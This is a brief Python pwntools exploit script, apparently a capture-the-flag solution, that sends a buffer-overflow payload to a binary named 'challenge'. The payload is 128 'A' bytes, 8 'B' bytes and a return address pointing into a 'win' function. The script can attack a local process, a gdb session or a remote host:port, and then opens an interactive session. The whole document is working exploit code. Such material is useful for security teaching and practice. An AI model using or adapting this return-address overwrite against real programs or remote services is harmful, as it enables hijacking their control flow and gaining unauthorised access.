#!/usr/bin/env python3

from pwn import *

import argparse

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--debug', action='store_true')
    parser.add_argument('--remote', type=str, default=None)

    args = parser.parse_args()

    elf = context.binary = ELF('./challenge')

    # After push rbp to make sure stack is 16-byte aligned
    # Most libc functions expect this because they use vectorized instructions
    win = elf.sym['win'] + 0x5

    if args.debug:
        conn = gdb.debug(context.binary.path, '''
        set follow-fork-mode child
        break main
        continue
        ''')
    elif args.remote:
        conn = remote(*args.remote.split(':'))
    else:
        conn = process()

    conn.sendline(b'A' * 128 + b'B' * 8 + p64(win))
    conn.interactive()
